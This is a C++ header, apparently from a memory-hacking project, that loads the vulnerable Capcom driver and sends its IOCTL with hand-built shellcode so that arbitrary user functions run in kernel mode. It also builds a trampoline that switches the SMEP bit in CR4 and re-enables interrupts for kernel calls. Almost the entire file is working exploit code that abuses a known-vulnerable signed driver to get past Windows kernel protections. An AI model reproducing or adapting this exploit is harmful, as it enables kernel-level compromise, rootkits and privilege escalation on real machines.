#pragma once
#include <windows.h>
#include <iostream>
#include <intrin.h>
#include "CapcomLoader.h"
#include "CapcomLockMemory.h"
#include "CapcomDriver.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

/********* BASIC WRAPPER *********/

#define IOCTL_RunPayload64  0xAA013044
#define PAYLOAD_BUFFER_SIZE 0x200

typedef PVOID(NTAPI* MmGetSystemRoutineAddress_t)(PUNICODE_STRING);
typedef VOID(NTAPI* UserFunc)(MmGetSystemRoutineAddress_t, PVOID userData);
static HANDLE device;

struct CapcomCodePayload {
    BYTE* pointerToPayload;
    BYTE  payload[PAYLOAD_BUFFER_SIZE];
};

void initIntSmepTrampoline();
BOOL InitDriver() {

    if (!LockMemorySections()) {
        cout << "InitDriver::LockMemorySections failed!" << endl;
        return FALSE;
    }

    if (!LoadDriver()) {
        cout << "InitDriver::Loading driver failed!" << endl;
        return FALSE;
    }

    device = OpenDevice("Htsysm72FB");
    if (!device) {
        cout << "InitDriver::Could not retrieve device!" << endl;
        return FALSE;
    }

    initIntSmepTrampoline();
    return TRUE;
}

BOOL UnloadCapcomDriver() {
    DecryptDriver();
    CloseHandle(device);
    if (UnloadDriver(globalCapcomDriverName.c_str())) {
        return FALSE;
    }
    if (RemoveSimilarDrivers(CAPCOM_DRIVER)) {
        return FALSE;
    }
    return TRUE;
}

void RunInKernel(UserFunc func, PVOID userData) {

    CapcomCodePayload* codePayload = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BYTE codePayloadBuf[] = {
        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, userData
        0x58,                                                       // POP RAX
        0xFF, 0x20                                                  // JMP [RAX]
    };

    *(ULONGLONG*)(codePayloadBuf + 5) = (ULONGLONG)func;
    *(ULONGLONG*)(codePayloadBuf + 15) = (ULONGLONG)userData;

    // BYTE codePayloadBuf[] = {
    //     0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, data
    //     0x48, 0x89, 0xC1,                                               // mov rcx, rax
    //     0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, destination
    //     0xFF, 0xE0                                                      // jmp rax
    // };

    // *(ULONGLONG*)(codePayloadBuf + 2) = (ULONGLONG)userData;
    // *(ULONGLONG*)(codePayloadBuf + 15) = (ULONGLONG)func;

    codePayload->pointerToPayload = codePayload->payload;

    ZeroMemory(codePayload->payload, PAYLOAD_BUFFER_SIZE);
    CopyMemory(codePayload->payload, codePayloadBuf, sizeof(codePayloadBuf));

    DWORD status = 0x0;
    DWORD bytesReturned = 0x0;
    DeviceIoControl(device, IOCTL_RunPayload64, &codePayload->pointerToPayload, sizeof(ULONG_PTR), &status, sizeof(status), &bytesReturned, 0);
    // VirtualFree(codePayload, sizeof(CapcomCodePayload), MEM_RELEASE); // do not do this, it causes random bluescreens
}

/********* CALLS WITH ENABLED INTERRUPTS AND SMEP *********/
using kernelTrampolineCall = uint64_t(*)(...);
using kernelFuncCall = uint64_t(__fastcall*)(...);

NON_PAGED_DATA static kernelFuncCall ExAllocatePoolPtr = 0;
NON_PAGED_DATA static kernelTrampolineCall TrampolineFuncPtr = 0;

static const uint32_t intAndSmepHandlingTrampolineStoreOffset = 0x34;
static const uint32_t intAndSmepHandlingTrampolineEnabledOffset = 0xB;
NON_PAGED_DATA static UCHAR intAndSmepHandlingTrampoline[] = {
	0x0F, 0x20, 0xE0,                                // mov    rax,cr4               ; -
	0x48, 0x0F, 0xBA, 0xE8, 0x14,                    // bts    rax,0x14              ; will be nop'd if no SMEP support
	0x0F, 0x22, 0xE0,                                // mov    cr4,rax               ; -
	0xFB,                                            // sti
	0x48, 0x8D, 0x05, 0x07, 0x00, 0x00, 0x00,        // lea    rax,[rip+0x7]         ; continue
	0x8F, 0x40, 0x12,                                // pop    QWORD PTR [rax+0x12]  ; ret_store
	0x50,                                            // push rax
	0xFF, 0x60, 0x1A,                                // jmp    QWORD PTR [rax+0x1a]  ; call_store
	0xFA,                                            // cli
	0x0F, 0x20, 0xE1,                                // mov    rcx,cr4
	0x48, 0x0F, 0xBA, 0xF1, 0x14,                    // btr    rcx,0x14
	0x0F, 0x22, 0xE1,                                // mov    cr4,rcx
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,              // jmp    QWORD PTR [rip+0x0]   ; ret_store

	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret_store:  dq 0
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // call_store: dq 0
};

template<typename ...Params>
NON_PAGED_CODE static uint64_t CallWithInterruptsAndSmep(PVOID ptr, Params &&... params) {
	*(PVOID*)(((PUCHAR)TrampolineFuncPtr) + intAndSmepHandlingTrampolineStoreOffset) = ptr;
	return TrampolineFuncPtr(std::forward<Params>(params)...);
}

NON_PAGED_CODE void __stdcall CreateIntSmepTrampoline(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    PVOID out = (PVOID)ExAllocatePoolPtr(0ull, sizeof(intAndSmepHandlingTrampoline));
	NonPagedMemcpy(out, intAndSmepHandlingTrampoline, sizeof(intAndSmepHandlingTrampoline));
	TrampolineFuncPtr = (kernelTrampolineCall)out;
}

void initIntSmepTrampoline() {
    if (TrampolineFuncPtr) {
        return;
    }

	int cpuInfo[4];
	__cpuid(cpuInfo, 0x7);
	
	if (!(cpuInfo[1] & (1 << 7))) { // EBX : 1 << 7 = SMEP
		// No SMEP support!
		NonPagedMemset(intAndSmepHandlingTrampoline, 0x90, intAndSmepHandlingTrampolineEnabledOffset);
	}
    ExAllocatePoolPtr = GetKernelProcAddress<>("ExAllocatePool");
	RunInKernel(CreateIntSmepTrampoline, NULL);
}






